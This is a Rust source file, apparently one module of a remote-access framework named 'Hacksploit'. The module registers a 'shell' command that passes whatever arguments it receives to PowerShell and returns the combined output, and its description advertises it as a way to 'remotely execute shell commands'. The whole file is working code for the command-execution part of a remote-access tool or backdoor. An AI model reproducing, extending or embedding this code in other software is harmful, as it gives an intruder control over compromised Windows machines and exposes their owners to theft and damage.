use std::io::Error;
use std::process::{Command, Output, Stdio};

use crate::HacksploitModule;

const ERROR_MESSAGE: &str = "Error: Unable to process that command.\n";

pub struct ShellModule {}

impl ShellModule {
    pub fn new() -> Self {
        ShellModule {}
    }
}

fn generate_output(cmd: String) -> Result<Output, Error> {
    Command::new("powershell")
        .arg(cmd)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
}

impl HacksploitModule for ShellModule {
    fn on_command(&self, args: Vec<&str>) -> String {
        let output = generate_output(args.join(" "));
        match output {
            Ok(mut output) => {
                let mut stdout = output.stdout;
                stdout.append(&mut output.stderr);
                match String::from_utf8(stdout) {
                    Ok(response) => {
                        return response;
                    }
                    Err(_) => return String::from(ERROR_MESSAGE),
                }
            }
            Err(_) => return String::from(ERROR_MESSAGE),
        }
    }
    fn get_name(&self) -> String {
        String::from("shell")
    }

    fn get_description(&self) -> String {
        String::from("Allows you to remotely execute shell commands. Usage: \"shell <command>\"")
    }
}
